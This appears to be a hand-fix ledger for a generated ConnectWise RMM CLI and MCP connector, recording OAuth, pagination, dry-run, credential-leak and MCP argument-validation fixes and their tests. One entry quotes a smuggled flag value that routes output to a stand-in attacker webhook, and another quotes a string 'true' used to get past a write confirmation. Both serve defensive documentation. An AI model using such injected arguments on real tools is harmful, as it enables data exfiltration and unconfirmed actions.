_comment: Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: The OAuth client-credentials mint posts a JSON body {grant_type, client_id, client_secret, scope} to the token URL of the client ID's region (0e30 NA, 0e31 EU, 0e32 AU), from the client auto-mint, `auth login` and `scopes` alike.
handfixes.why: The press mints with a form-encoded body plus HTTP Basic, and ConnectWise Asio rejects both: credential-less probes of https://openapi.service.itsupport247.net/v1/token on 2026-10-13 returned 400 'failed to decode request invalid JSON' for form encoding and for form + Basic, and the documented 404 'oauth app does not exist' only for a JSON body (receipt: cli-factory/connectwise-rmm/sources/token-probe-2026-10-13.txt). Asio also runs separate NA/EU/AU gateways and the client ID prefix names the region (ConnectWise University, 'Agent Last Seen API'), so an EU or AU tenant minting against the NA default would fail every request. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices. 4.35.1 reprint (2026-11-02): press 4.35.1 routes every token request through guardOutbound/GuardTokenRequest with the form body; the Asio mint passes its JSON body (AsioTokenBody) so the plaintext refusal and host pin still see the credential. The generated token_race_test decoded a form body and now decodes JSON.

asserts.contains: req, err := NewAsioTokenRequest(ctx, tokenURL, clientID, clientSecret, resolveClientCredentialsScope(), resolveClientCredentialsUserAgent())

handfixes.summary: Generated with --transport standard, so the client uses a clone of net/http's default transport instead of the community-spec default HTTP/2 browser-impersonation transport (github.com/enetx/surf).
handfixes.why: The spec is a community-sourced Asio OpenAPI, and the press picks the browser-chrome transport for community specs. Asio is a plain partner REST gateway with no bot wall; the impersonation stack adds a large dependency tree (enetx/surf, utls, http3) to every binary and changes TLS fingerprints for no benefit. regen.sh passes --transport standard; a reprint without it would silently switch transports.
handfixes.spec_encode_followup: regen.sh carries --transport standard on the generate command line; there is no spec extension for it yet.

handfixes.summary: `tickets list` never sends pageSize or pageNum alone: --page-size by itself is paired with pageNum=1, --page-num by itself is refused before any request, and sync stores the unpaged response instead of the press's auto-pagination. The MCP execute tool (code_orch.go) applies the same pairing to tickets.list.
handfixes.why: The Asio ticket list documents that pageSize must be sent with pageNum and that either one alone is ignored or returns an empty page with a total count of 0 even when records exist. The press's generic paginator sent one paging key at a time, which on Asio reads as 'no tickets'. Encoded in the spec as x-pp-pagination: none on GET /api/platform/v1/service/ticketing/tickets, so a reprint from the same spec keeps it; the asserts catch a reprint from a spec that lost the extension. Acceptance (cli-factory/connectwise-rmm/acceptance/accept.sh) proves page 2 returns and that no request ever carries a lone paging key. Codex review (2026-10-13) caught that the generated flag retention still forwarded a lone --page-size; RunE now pairs or refuses, and tickets_paging_test.go drives both cases against a stub server. Codex round 2 caught the twin: connectwise-rmm_execute on tickets.list forwarded a lone pageSize; TestCodeOrchTicketsListPairsPagingKeys pins it.
handfixes.spec_encode_followup: Already encoded in spec.yaml (x-pp-pagination: none); keep the extension on any spec refresh.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element, and the reachable appendRecipePositional call site (why_did_the_script_fail's task_id) first runs rejectFlagLikeRecipeValue, which refuses a value beginning with '-' (except the bare '-') before the CLI runs. Also: the press's recipe lifter read the hyphenated subcommands 'reboot-due' and 'task-failures' as a positional 'slug' parameter; both handlers now run a static subcommand.
handfixes.why: Press 4.33.5 still emits the fleet-wide recipe argv gap (see skills/acronis/handfixes.json, mcp-recipe-argv-not-flag-like): a recipe positional is appended ahead of the recipe's own flags, so {"task_id": "--deliver=webhook:https://attacker/"} would be parsed by pflag as the denylisted root flag. The lifter defect made the reboot_queue tool demand a meaningless required 'slug' argument and splice it into argv as a subcommand. recipe_intents_test.go pins both: the corrected argv and the refusal of flag-shaped task_id values. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices. 4.35.1 reprint (2026-11-02): press 4.35.1 places a flag-like recipe positional after `--` (insertRecipeBeforeEndOfFlags) and re-checks exposure with recipeTargetExposed(recipePath); the lifter still reads reboot-due/task-failures as slug/slug2, so the two handlers stay hand-made, their recipePath names the real subcommand (so the exposure check reads fleet reboot-due, not the fleet parent), and the generated per-tool slug tests were replaced. bin/reapply.py re-applies it.

handfixes.summary: Saving config (after a token mint or auth login) writes the base_url and token_url the config FILE had, never a runtime value from CONNECTWISE_RMM_BASE_URL, CONNECTWISE_RMM_TOKEN_URL or region inference.
handfixes.why: Every mint calls SaveTokens, which rewrites config.toml. Without this, one run with CONNECTWISE_RMM_BASE_URL pointed at a test host, or one run where the client ID's prefix inferred the EU or AU host, was written into the file and silently pinned every later run, including runs for a different client ID. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.

handfixes.summary: doctor treats a configured client ID and secret as configured auth, and verifies the credential with an authenticated GET /v1/rate_limits (needs a token, no scope) instead of printing 'present, not verified'; a 404 there turns the api row red, and a failed token mint is reported as a rejected credential with the scopes remedy.
handfixes.why: Measured by tools/maintainer/check_doctor_truth.py (issue #282). The 4.33.5 doctor failed that gate on this connector: 'present, not verified' in the healthy state, an HTML 200 at / read as a healthy API in the wrong-base state, and an identical credentials verdict whether the credential worked or not. On a real install it was worse: with CONNECTWISE_RMM_CLIENT_ID and CONNECTWISE_RMM_CLIENT_SECRET set on a fresh machine it printed 'FAIL Auth: not configured' plus a hint to export the variables the operator had already exported, because the pair only becomes a bearer token after the first mint. Verified against the factory mock: valid secret -> 'valid (verified with GET /v1/rate_limits)'; wrong secret -> 'ERROR rejected: the token request failed'; key lacking a default scope -> rejected with the `scopes` remedy; no credential -> explicit ERROR row.

handfixes.summary: Every operator-facing variable this connector reads is declared on all three install channels (manifest.json for the .mcpb, server.json for the MCP Registry, mcp-install.md for manual installs), with matching required/secret flags; the manifest name and entry point are the stripped connectwise-rmm-mcp.
handfixes.why: Issue #282: a variable the binary reads but the manifest never declares is one Claude Desktop never prompts for. The press manifest declared only CLIENT_ID and CLIENT_SECRET, so the region override, the scope list (needed whenever the key lacks one default scope, since Asio then rejects the whole token request), the MCP read-only kill switch and the HTTP transport token were unreachable from a bundle install, and server.json marked all of them required and secret. manifest.json, server.json and mcp-install.md are regenerated by /msp-skills-publish on every re-onboard (server.json keeps a hand-curated env list), so without this ledger a regeneration silently drops declarations while check_env_schema.py is the only other line of defence. The source manifest in ~/printing-press/library/connectwise-rmm carries the declarations so a resume re-derives mcp-install.md from them. PRINTING_PRESS_CLIENT_PROFILE stays declared because check_env_schema.py fails a variable the binary reads (internal/platform/profile.go) but no channel declares; its title and description say it is unused, because this connector registers no platform source (registerPlatformSource has no caller), so BindMCPServerProfile returns immediately and the value binds nothing. The press text promised tenant binding (Codex review 2026-10-13, P1). Its twins carry the same truth: the root --client-profile help says it is unused, and "client-profile" is in blockedRootFlags so the 32 MCP tool schemas no longer offer an inert tenant selector (fresh adversarial review 2026-10-13, P2).

handfixes.summary: The local SQLite store is named from the API client ID and API host (config.StoreScopeIdentity), not from a hash of every credential field that happens to be loaded.
handfixes.why: Found by the fresh-context adversarial review on 2026-10-13. The generated store key hashed every loaded credential field, and the first token mint caches client_id/client_secret beside the env copies. On a fresh install the first `sync` therefore wrote data-<hashA>.db and every later command read data-<hashB>.db: guide.md's own Quick Start (doctor --dry-run, scopes, sync) ended with every fleet roll-up returning scanned_endpoints: 0, the MCP sync tool did the same, and dropping the env vars after caching moved to a third file. The factory acceptance suite passed --db explicitly and never saw it. TestAsioStoreScopeStableAcrossMint pins env-only, minted, cached-only and rotated-secret configs to one key and two clients to two keys (it fails with the init hook removed). Lives in the hand-owned internal/config/connectwise_rmm_config.go, which regen.sh copies forward, but the generated config.go must keep the StoreScopeIdentity hook.

handfixes.summary: The MCP execute tool (code orchestration) sends a DELETE's non-path params as a JSON body, so endpoints.uninstall carries endpoints, feedback and reason exactly as the CLI's `endpoints uninstall` does.
handfixes.why: Codex review (2026-10-13, P1): the generated executor routed every DELETE param to the query string and sent no body, while Asio's only DELETE (/api/platform/v1/device/endpoints/uninstall) reads its request from the body, so offboarding through connectwise-rmm_execute could never succeed. No per-endpoint MCP tool exists for uninstall, so execute is the only MCP path. code_orch_delete_body_test.go drives execute against a stub and fails on the generated routing (params leaked to the query string). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice. 4.35.1 reprint (2026-11-02): 4.35.1 splits reads (connectwise-rmm_read) from writes (connectwise-rmm_execute, preview until confirm: true); the test now proves an unconfirmed uninstall sends nothing and a confirmed one sends the JSON body, and the tickets.list pairing test calls the read tool.

handfixes.summary: --dry-run previews with cached credentials only: neither an API command nor `auth login --dry-run` POSTs the client ID and secret to the token URL or writes credentials.toml.
handfixes.why: Codex review (2026-10-13, P2), reproduced: authHeader ran before the dry-run branch and minted a token when none was cached, so a preview sent the client secret to the live Asio token endpoint and persisted it, while the generated comment and the docs say a dry run sends no request. TestDryRunNeverMintsAToken counts requests to a stub token server and fails on the generated order. Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice. Codex round 2 caught the twin: auth login mints through its own path (mintClientCredentialsToken), which ignored flags.dryRun; TestAuthLoginDryRunSendsNothing pins it.

handfixes.summary: The MCP shell-out layer forwards an explicit boolean false as --name=false instead of dropping it, so a default-true flag can be turned off from a tool call.
handfixes.why: Codex round 2 (2026-10-13, P2): cliArgsFromMCP emitted only true booleans, so MCP `tail` with {"follow": false} kept the default --follow=true and polled until the call timed out instead of returning one poll. pflag accepts --flag=false for every bool flag, and blocked flags are filtered before this point, so forwarding the caller's explicit value is the faithful translation. bool_false_test.go fails on the generated code (argv carried only --json). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source carries it); a regen that skips it drops it while go build stays green.
handfixes.spec_encode_followup: Press-side: cliArgsFromMCP should forward explicit false; fleet-wide generator behaviour.

handfixes.summary: endpoints list-company and list-site carry low-entropy placeholder UUIDs in their pp:happy-args annotation instead of the vendor-docs sample UUID
handfixes.why: The press copies the spec's path-parameter example into pp:happy-args as clientID=<uuid>. The vendor-docs sample UUID (436f6d6d-...) is high-entropy and sits right after the word client, so gitleaks generic-api-key flags both files and the guards job fails. The value is example data, not a credential; the fix is an obviously fake placeholder, never an allowlist. A reprint from the unchanged spec regenerates the sample UUID.
handfixes.spec_encode_followup: Change the example: values for clientID/siteID on /api/platform/v1/device/clients/{clientID}/endpoints and .../sites/{siteID}/endpoints in cli-factory/connectwise-rmm/spec.yaml to 00000000-0000-0000-0000-000000000001 / ...0002 so a reprint emits these placeholders by construction.

handfixes.summary: The generator's hidden Cobra alias `create` is removed from the 1 command listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs it
handfixes.why: cli-printing-press gives a POST endpoint command the hidden alias `create`. On these commands the POST is destructive, so an agent that guessed the conventional verb (`<group> create`) ran the destructive call, and the alias appeared nowhere in help, agent-context or governance.md. Reproduced on origin/main 6416a241b against a local fake server: `maxio-cli subscriptions purge-json create sub_123 --ack 1` sent POST /subscriptions/sub_123/purge.json, `sentinelone-cli reports create` sent POST /reports/delete-reports and `tactical-rmm-cli agents shutdown create agent-42` sent POST /agents/agent-42/shutdown/. Fleet gate: tools/maintainer/check_command_tree.py, which walks the real cli.RootCmd() tree (137 such commands in 28 connectors on 6416a241b, 0 after). The canonical command names are unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate fails while the alias is present. Commands here: tasks schedule (POST /api/platform/v1/automation/endpoints/schedule-tasks).
handfixes.spec_encode_followup: Press-side: emit the `create` alias only for operations that create something.

handfixes.summary: The two derive-lock tests (ContendedAppendIsDerivedBeforeReturn, CaughtUpPassDoesNotWait) wait on what the pass is doing, read from goroutine stacks, instead of fixed 200 ms, 500 ms and 5 s windows; every remaining wait is bounded by the test binary's own deadline
handfixes.why: On windows(fortinet) in CI (2026-10-22, PR #421) the contended test failed with 'contended pass did not finish after the peer released the lock': after release the pass opens a fresh SQLite store and commits, and a slow Windows runner took longer than the fixed 5 s. The 200 ms 'did not return while held' window was also weak: on a slow runner it could elapse before the pass even reached the wait. The contended test now waits until the pass is provably blocked in cliutil.WithFileLock called from DeriveFlagCorrections (it cannot return before release), so it is stronger, not weaker. Proven: a pass that returns early under contention fails it; a caught-up pass that polls or blocks fails the caught-up test; with a simulated 6 s store open after the lock, the old test fails with the CI message and the new one passes.
handfixes.spec_encode_followup: Press-side: the generated internal/learn derive_test.go should use this state-based wait in place of the fixed windows.

handfixes.summary: The token client's same-origin check compares hosts the way the network resolves them: an IP literal by address with an exact IPv6 zone, a DNS name ASCII case-insensitively, a non-ASCII name exactly
handfixes.why: Owner decision on PR #441 (finish the auth-wire class). Press 4.33.5 already sends every token request through cliutil.OAuthTokenHTTPClient, but its oauthTokenSameOrigin compared hostnames with strings.EqualFold, which also folds IPv6 zone names (fe80::1%LAN0 passed for fe80::1%lan0, two different peers when the interfaces differ) and Unicode case. It now compares an IP literal exactly as a netip.Addr (zone included) and folds ASCII case only for DNS names. TestOAuthTokenSameOriginComparesHostsLikeTheNetwork failed on the previous commit and passes now; TestAuthLoginRefusesATokenRedirectToAnotherOrigin pins the login path.
handfixes.spec_encode_followup: Press-side: auth.go.tmpl and client.go.tmpl in press 4.33.5 already route token requests through cliutil.OAuthTokenHTTPClient; oauthTokenSameOrigin should compare IP literals exactly (zone included) and fold ASCII case only for DNS names.

handfixes.summary: `import` is annotated mcp:hidden: it needs --input, a local file an MCP caller may not choose, so it is CLI-only instead of a tool that always fails.

handfixes.summary: Runtime proof that a rejected client_credentials mint returns an error instead of deadlocking on the token-state lock, before the call and after a 401.
handfixes.why: fleet/bin/mint_lock_scan.py exits 1 on the native 4.35.1 client (doInternal/authHeader -> mintClientCredentials, refreshAccessToken -> maskHeldError), the same static false-RED xero recorded: the mint masks with held=true and never re-takes lockTokenState. mint_reject_test.go drives a 401 from the token URL on both entry paths and fails with a 10 s deadlock timeout when maskHeldError is mutated to held=false (seen 2026-11-02).

handfixes.summary: Every mirrored MCP shell-out tool refuses an argument whose JSON type differs from the flag it sets: a bool flag takes only a JSON boolean, a number flag only a number, so a string "true" can never set run --confirm, --yes or --dry-run.
handfixes.why: Codex r1 (2026-11-02, P1, write without boolean confirmation): cliArgsFromMCP turns any value into --name=value text and the MCP server does not validate input schemas, so {"name":"run","arguments":{...,"confirm":"true"}} scheduled a script. The check sits in guardMirroredMCPCall (the one place that holds the Cobra command) and closes the class for every bool and number flag, not only confirm. arg_types_test.go failed on the pre-fix tree (confirm "true" ran).
handfixes.spec_encode_followup: Press-side: cliArgsFromMCP (or the shell-out handler) should check argument kinds against the flag type.

handfixes.summary: system-state parsing keeps every loggedOnUsers entry (a non-object entry is kept as an empty session), and only a session explicitly reported Disconnected is ignored by fleet reboot-due; any other session, named or not, with any or no status, keeps the endpoint in coordinate instead of reboot_now.
handfixes.why: Codex r1 (2026-11-02, P1, wrong result an MSP would act on): username is optional in spec.yaml#/components/schemas/SystemStateLoggedOnUsers, and the parser dropped username-less sessions, so {"loggedOnUsers":[{"sessionID":"1","sessionName":"Console","status":"Active"}]} put the endpoint in reboot_now. TestRebootTriageCountsActiveSessionWithoutUsername failed on the pre-fix tree. Codex r2 (2026-11-02, P1, same class): the r1 fix still dropped username-less sessions that were not exactly Active, so {"loggedOnUsers":[{"sessionID":"1","sessionName":"Console"}]} (no status; status is optional in the same schema) put a pending-reboot endpoint in reboot_now. Class fix: fail closed, skip only explicit Disconnected. TestRebootTriageUnknownActivitySessionNeedsCoordination failed on the r1 tree (no status, other status, empty object, non-object entry).

handfixes.summary: The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand. internal/credwire/declarations.go holds the one Declarations literal: SecretEnv CONNECTWISE_RMM_CLIENT_ID, CONNECTWISE_RMM_CLIENT_SECRET, CONNECTWISE_RMM_MCP_HTTP_TOKEN (sent nowhere) and SPACEFAST_TOKEN (bound to https://api.spacefast.com); URLEnv CONNECTWISE_RMM_TOKEN_URL and SPACEFAST_API_URL; Files the config the run really uses (an explicit --config or CONNECTWISE_RMM_CONFIG first, else config.toml, else the legacy path), with credentials.toml and profiles.json held, not returned; the token endpoint's access_token declared as a response field; base_url the default allowed origin, plus one minted source per Asio regional host that config.HoldForAsioRegion binds a run's own credentials to when the config resolves that host for the API or the token URL. credkit.Start is the first statement and credkit.Exit the last of both mains. Every http.Client sends through credkit.Transport (cliutil.OutboundGuard: the API client, auth login, scopes, doctor probes, --deliver, Spacefast, feedback), files through credkit.WriteFile/AppendFile/OpenFile/NewWriter except the credential store and config rewrites (cliutil.AtomicWriteCredentialFile, a declared exemption), SQLite through credkit.SQLDriver (internal/credsql), the MCP server through MCPTools/MCPIn/MCPOut/MCPHTTP, the MCP shell-out through credkit.RunCommand. Minted tokens (auto-mint, auth login, every scopes probe) and a built Authorization header are held the moment they exist.
handfixes.why: The 4.35.1 print closes credential classes one sink at a time (RedactTokenBody, maskHeldError, the outbound guard); each review round found another: a JSON-escaped token key in a token-endpoint error printed the minted token (kit-findings row 26), a minted token reached `scopes` output, a stored bearer went over plain http, a --stdin body's password printed in a dry run, a password inside an unparseable base_url printed at startup. The kit is one reviewed implementation of the leak contract. Seen failing on binaries built from the pre-kit tree (d0604b6650) and passing after (internal/credwire). The client ID is held, not an identifier: the manifest marks it sensitive and it is half of the credential pair, and no public text shares an 8-character piece with it (its region prefix is 4 characters), so holding it withholds no API host (TestClientIDDoesNotWithholdTheAPIHost). --client-id is not a declared credential flag because `endpoints create-agent-install-token --client-id` names a company; auth login holds its own --client-id value. Known limit: a token URL on a non-Asio origin other than the base URL is refused (no constant origin can be declared for it). No connector-side holding code retired: RedactTokenBody and maskHeldError stay (press template or a readable redaction the kit backstops).
handfixes.spec_encode_followup: Press-side: generate the kit wiring, the Declarations literal and the kit-wrapped SQLite driver.

handfixes.summary: The learn journal keeps no text the operator typed in place of a declared name. The CONNECTWISE_RMM_LEARN_SESSION override is stored as "o:" plus the same 64-bit SHA-256 hash the harness session ids get; argv_shape records only flag names the invoked command declares under exactly the typed name, every other name as the "<undeclared>" placeholder (redacted), and nothing after "--"; failed_flag is never kept as typed ("--<undeclared>:" plus the typed name's hash when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Operator-named text that repeats a credential the program holds is withheld by the shared credential kit at the sink (credkit-wiring). journal_credential_hardening_test.go drives each path, holds through the kit in its held pass, and fails if a credential reaches any file under the test home.
handfixes.why: Press 4.35.1 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. These are names the kit never holds, so they stay hand-fixes. Seen failing on the pre-wire tree (the raw session key, argv after --, the typed flag kept, failed flags not opaque, teach.log arguments) and passing after; the shape and tests follow action1's entry of the same id. Known limits: a guessable override or typed name can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment.
handfixes.spec_encode_followup: Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at "--"; the failed flag should be an opaque identity; teach.log should not echo raw arguments.

handfixes.summary: sync wraps the event writer its parallel workers share in syncSerialWriter (internal/cli/sync_event_writer.go), so two workers never call Write on it at once.
handfixes.why: The generated sync hands cmd.OutOrStdout() (or ErrOrStderr() in machine output) to every --concurrency worker, and each writes sync_start, progress and error events. os.Stdout tolerates that; the writers --deliver (a mirror into a bytes.Buffer) and --receipt-file / --audit-dir (a running SHA-256) install do not, nor does an in-process caller's buffer: Windows CI on PR #655 panicked in bytes.Buffer.grow from syncResource, and go test -race found 28 races on veeam. TestSyncWorkerPoolSerializesEventWrites pins it. A reprint regenerates sync.go and drops the wrap; tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json sync-event-writer-serialized).
handfixes.spec_encode_followup: Press-side (mvanhorn/cli-printing-press#5369): the sync template should serialize the event writer its top-level worker pool shares, as its dependent path already does with lockedWriter.

handfixes.summary: the adaptive limiter's blind ramp raises only a rate the last Wait slept on, so sync's rate_rps reports a real pace
handfixes.why: On a header-less API the ramp multiplied the rate by 1.25 every 10 successes with no ceiling: mcp2's hubspot sync printed rate_rps 6.6e24 (about 2,500 requests), and after such a ramp a 429's halving could no longer slow a single request. A rate the requests never reach is no longer raised. Re-applied after a reprint by replay_handfixes.py (recipe limiter-paced).

handfixes.summary: a resource the vendor refuses this token (HTTP 403) is recorded as skipped and no longer holds store_status at partial; a resource that errored stays partial and is named.
handfixes.why: A 403 resource never completes, so its sync_state row stayed at 0 and store_status read partial for good after a clean exit 0 (#692). store_status now says complete_with_skips only when every other resource finished, and search, sql and sync_summary name what was skipped or failed. A reprint regenerates sync.go and mcp/tools.go and drops this; tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json sync-forbidden-not-partial).
handfixes.spec_encode_followup: Press-side: sync should record a resource the vendor refuses separately from one that failed (not filed yet).
